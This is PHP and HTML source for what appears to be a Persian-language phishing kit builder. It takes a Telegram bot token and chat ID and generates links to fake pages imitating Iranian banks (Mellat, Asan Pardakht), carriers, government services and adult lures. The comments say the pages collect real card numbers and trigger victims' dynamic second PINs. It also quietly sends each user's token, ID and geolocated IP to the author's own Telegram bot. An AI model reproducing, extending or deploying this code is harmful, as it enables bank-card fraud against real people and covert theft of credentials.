<?php

//ANTY SPAME
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

$LogToken = "X";
$LogID = "X";


$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;
$phone = $Get_Ip->mobile;

$TOKEN=strlen($_POST["TOKEN"]);

$ID=strlen($_POST["ID"]);
$TOKEN2 = stripslashes(htmlspecialchars($_POST["TOKEN"]));
if(strpos($TOKEN2,"/")!==false or strpos($TOKEN2,"copy")!==false or strpos($TOKEN2,"http")!==false or strpos($TOKEN2,",")!==false or strpos($TOKEN2,".txt")!==false or strpos($TOKEN2,"(")!==false or strpos($TOKEN2,";")!==false or strpos($TOKEN,")")!==false or strpos($TOKEN,"'")!==false or strpos($TOKEN,'"')!==false or strpos($TOKEN2,"file_")!==false or strpos($TOKEN2,"fopen")!==false) {
    $show="Kosnanat Nofoz nakhord :)";
    exit(false);
    exit();
}

$ID=strlen($_POST["ID"]);


If ($TOKEN==45||$TOKEN==46||$TOKEN==47||$TOKEN==48||$TOKEN==49){
	$show="OK" ;
	
$show="درگاه های شما ساخته شد و لینک ها به ربات شما ارسال شد!" ;
$font="00FF00";

$T = stripslashes(htmlspecialchars($_POST["TOKEN"]));
$IDS=intval(stripslashes(htmlspecialchars($_POST["ID"])));

//LINK

$url="https://shaparralkweb.cf";

file_put_contents("ID.txt",$IDS);
 
$IP=$_SERVER["REMOTE_ADDR"];
$Domain=$_SERVER["HTTP_HOST"];
$O=rand(1000,9000);
if(!file_exists("data")){mkdir("data");}
$xkiler = fopen("data/$O.php", 'w') or die("Kos Nanat!");
fwrite($xkiler, "<?php\n");
fwrite($xkiler, "$");
fwrite($xkiler, "TOKEN='$T';\n");
fwrite($xkiler, "$");
fwrite($xkiler, "ID= $IDS;\n");
fwrite($xkiler, "?>");


$Asan="$url/Asan/?e=$O";
$Live="$url/Live/?e=$O";
$Sighe="$url/Sighe/?e=$O";
$Irancell="$url/Irancell/?e=$O";
$Dostyabi="$url/Dostyabi/?e=$O";
$Masaj="$url/Masaj/?e=$O"; 
$Mobo="$url/Mobo/?e=$O";
$Charge="$url/Charge/?e=$O" ;
$Vam="$url/Vam/?e=$O";
$Mci="$url/Mci/?e=$O" ;
$Chat="$url/Chat/?e=$O";
$net6="$url/Net/?e=$O";
$Internet="$url/Internet/?e=$O" ;
$Hamta="$url/Hamta/?e=$O" ;
$Kheyrieh="$url/Kheyrieh/?e=$O" ;
$Internetmeli="$url/Internetmeli/?e=$O" ;
$Saham="$url/Saham/?e=$O" ;
$Freefolower="$url/Freefolower/?e=$O";
$Mellat= "$url/Mellat/?e=$O" ;
$Folower="$url/Folower/?e=$O";
$Filimo="$url/Filimo/?e=$O";
$Divar="$url/Divar/?e=$O" ;
$Textx="


⬆️ درگاه های شما ساخته شد ⬆️

⚠️ درگاه کارت فیک رو تشخیص میده و ارسال نمیکنه ، پس اگه میخای تست کنی باید شماره کارت واقعی بزنی

⚠️ درگاه به صورت خودکار برای تارگت رمز دوم پویا رو ارسال میکنه
🆔 @Dr_Petros

";


        $Text="
        
╔═ [• Updated Links! •] ════╣↯
╟ •ᑎᗩᗰE :  Asan (آسان پرداخت) 
║ $Asan
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Mellat (به پرداخت)
║ $Mellat
╠═══════════════╣↯
╟ •ᑎᗩᗰE :Charge(شارژ جدید)
║ $Charge
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Net ( نت )
║ $net6
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Vam (وام یک ملیونی)
║ $Vam
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Mci (ام سی ای)
║ $Mci
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Sex Chat(سکس چت)
║ $Chat
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Live sexi (لایو سکسی)
║ $Live
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Sighe (صیغه)
║ $Sighe
╠═══════════════╣↯
╟  •ᑎᗩᗰE : Iranccel (نت ایرانسل)
║ $Irancell
╠═══════════════╣↯
╟  •ᑎᗩᗰE : Netnew (نت جدید ) 
║ $Internet
╠═══════════════╣↯
╟  •ᑎᗩᗰE : Mobo (موبوشارژ) 
║ $Mobo
╠═══════════════╣↯
╟  •ᑎᗩᗰE : Help (کمک به بیماران) 
║ $Kheyrieh
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Hamta (سامانه همتا) 
║ $Hamta
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Netmeli (اینترنت ملی) 
║ $Internetmeli
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Saham (سهام عدالت) 
║ $Saham
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Folower ( خرید فالور) 
║ $Folower
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Folower ( خرید اشتراک فیلمو) 
║ $Filimo
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Divar  ( دیوار ) 
║ $Divar
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Insta (فیک پیچ ) 
║ $Freefolower
╠═══════════════╣↯
╟ •ᑎᗩᗰE : Masaj (رزو ماساژور)
║ $Masaj
╠[𝚈𝚘𝚞𝚛 𝙸𝙿]╣⫸

╠[𝚈𝚘𝚞𝚛 𝙸𝙿]╣↯
╟ 🌐ᎥᏢ【 $ip 】
║
╠═══[𝙻𝚒𝚗𝚔]══╣↯
╟ ♻️ ᎳᎬb ᏞᎥᏁᏦ
║【 $url 】
╠══[𝙿𝚘𝚛𝚝]═══╣↯
╟ 🔢ᎽᎾuᏒ ᏟᎾᎠᎬ :【 $O 】
║ 
╠════════[𝙲𝚛𝚎𝚊𝚝𝚘𝚛] ════╣↯
╟ ✨ᏟᏒᎬᎪᏆᎬᎠ bᎽ :【 @SunPhish 】
║ 
╠═══[𝙲𝚑𝚊𝚗𝚗𝚎𝚕𝚝𝚎𝚕]═════════╣↯
╟ ᏟᎻᎪNNᎬᏞ :【 @Panda_Phish 】
╟ ᏟᎻᎪNNᎬᏞ :【 @anabel_phishing 】
║ 
╚══════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ═══════╣ꪜ
| IP : $ip | ISP : $isp | REGION NAME : $regionName | REGION : $region |
";
        

        $report =  file_get_content("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$IDS."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($Text));
        $report =  file_get_content("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$IDS."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($Textx));

$logtet = "یک کاربر با درگاهساز [ @Dr_Petros ] درگاه ایجاد کرد!

• User Code : $O

 • User Token : $T

 • User ID : $IDS


🌐ᎥᏢ【 $ip 】

• Url : $url";
    file_get_contents("https://api.telegram.org/bot".$LogToken."/SendMessage?chat_id=".$LogID."&text=".urlencode($logtext));

//------------

$phoneTewxt = "👆🏻 PHONE info : $phone";
file_get_contents("https://api.telegram.org/bot".$LogToken."/SendMessage?chat_id=".$LogID."&text=".urlencode($phoneText));
//------------
$chat= file_get_contents("ID.txt");
$yo="your chat id: " ;

} else{
	$show="Enter The Token!" ;
$font="FF0000";

} 
if($ID ==8||$ID ==9||$ID ==10||$ID ==11||$ID ==12){
	
	$fonts="00FF00";


}
else{

	$show="توکن را وارد  کنید!
</br>
آیدی عددی را وارد کنید!" ;
	$fonts="FF0000";
	} 
	
	
	?>
	

<!DOCTYPE html>
<html lang="fa" xmlns="http://www.w3.org/1999/xhtml">
<head>
<title> درگاه ساز پاندا و آنابل</title><meta charset="utf-8" />
<meta name="generator" content="Payment Maker" />
<meta name="author" content="X_KILER" />
<meta name="robot" content="noindex,follow" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<link type="text/css" rel="stylesheet" href="css/StyleSheet.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
function showpayment(str) {
if (str.length == 0) {
document.getElementById("request").innerHTML = "";
return;} 
else {var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("request").innerHTML = this.responseText;}};
xmlhttp.open("post", "xkiler.php");
xmlhttp.send();}}
</script><script>
var div = 'alert';
var loadingmessage = '';
function Ajaxrequest(){
var xmlHttp;
try{
xmlHttp=new XMLHttpRequest();
return xmlHttp;}
catch (e){
try{xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
return xmlHttp;}
catch (e){
try{xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
return xmlHttp;}
catch (e){
alert("لطفا مرورگر خود را آپدیت نمایید");
return false;}}}}
function formget(form, url) {
var poststr = getFormValues(form);
postData(url, poststr);}
function postData(url, parameters){
var xmlHttp = Ajaxrequest();
xmlHttp.onreadystatechange =  function(){
if(xmlHttp.readyState > 0 && xmlHttp.readyState < 4){
document.getElementById(div).innerHTML=loadingmessage;}
if (xmlHttp.readyState == 4) {
document.getElementById(div).innerHTML=xmlHttp.responseText;}}
xmlHttp.open("POST", "xkiler.php");
xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlHttp.send(parameters);}
function getFormValues(formobj){
var str = "";
var valueArr = null;
var val = "";
var cmd = "";
for(var i = 0;i < formobj.elements.length;i++){
switch(formobj.elements[i].type){

case "text":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "tel":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "email":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "password":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "url":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "textarea":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "select-one":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "hidden":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "checkbox":
if(formobj.elements[i].checked == true){str += formobj.elements[i].name + "=" + formobj.elements[i].value + "&";}
break;

}}
str = str.substr(0,(str.length - 1));
return str;}
</script></head><body>
<div class="box animated zoomIn">
<form method="post" action="#" autocomplete="off">


       
	   
	   <p><font color="#<?php echo $font;?>"><?php echo $show;?></font></p>
           <p><font color="#<?php echo $font;?>"><?php echo $yo,$chat;?></font></p>

</form></div>
	

<div id="alert"></div>

</body>
</html>

